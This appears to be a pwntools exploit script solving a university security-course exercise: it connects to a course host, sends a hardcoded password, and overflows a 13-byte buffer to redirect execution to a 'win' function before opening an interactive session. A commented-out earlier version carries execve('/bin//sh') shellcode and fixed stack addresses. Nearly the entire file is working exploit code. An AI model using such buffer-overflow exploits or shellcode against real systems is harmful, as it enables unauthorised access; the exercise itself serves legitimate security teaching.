#!/usr/bin/env python
# -*- encoding: utf-8 -*-

# approx diff between gdb and nc = 2096
#
# from pwn import *
#
# NOP_OPERATOR = '\x90'
# SHELLCODE = '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80'
#
# LEN_SHELL = len(SHELLCODE)
#
# def main():
#     target = "midsem.6447.sec.edu.au"
#     port = "8011"
#
#     win = 0x8048668
#
#     stack_start = 0xffffd590
#     ret = 0xffffd5dc
#
#     buf_len = 13
#
#
#     password = "\x6c\x33\x33\x74"
#
#     r = remote( target, port )
#
#     r.sendline(password)
#     r.sendline("A")
#     r.sendline( "A" * buf_len + p32(win) )
#
#     r.interactive()
#
# if __name__ == '__main__':
#     main()


from pwn import *
target = "midsem.6447.sec.edu.au"
port = "8011"

win = 0x8048668

buf_len = 13

password = "\x6c\x33\x33\x74"

r = remote( target, port )

r.sendline(password)
r.sendline("A")
r.sendline( "A" * buf_len + p32(win) )

r.interactive()
